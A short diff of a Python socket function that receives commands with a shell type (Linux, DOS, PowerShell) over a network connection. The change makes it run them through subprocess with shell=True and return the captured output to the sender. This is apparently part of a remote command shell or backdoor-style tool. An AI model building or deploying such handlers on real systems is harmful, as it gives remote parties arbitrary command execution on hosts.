@@ -62,11 +62,11 @@ def discussion(conn):
             conn.send(reply.encode())
         else:
             if b.lower() == "linux":
-                reply =str(os.system(a))
+                reply =subprocess.check_output(a, shell=True).decode().strip()
                 conn.send(reply.encode())
 
             elif b.lower() =="dos":
-                reply = str(os.system(a))
+                reply =subprocess.check_output(a, shell=True).decode().strip()
                 conn.send(reply.encode())
 
             elif b.lower() == "powershell":
